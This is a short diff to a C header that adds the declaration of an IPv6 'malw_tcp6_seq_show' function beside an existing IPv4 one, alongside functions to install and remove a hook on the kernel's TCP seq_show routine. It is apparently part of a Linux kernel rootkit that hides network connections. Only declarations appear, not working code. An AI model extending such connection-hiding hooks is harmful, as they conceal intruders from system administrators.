@@ -8,6 +8,7 @@
 #include <linux/tcp.h>
 
 asmlinkage long malw_tcp4_seq_show(struct seq_file *, void *);
+asmlinkage long malw_tcp6_seq_show(struct seq_file *, void *);
 void install_tcp_seq_show_hook(void);
 void remove_tcp_seq_show_hook(void);
 
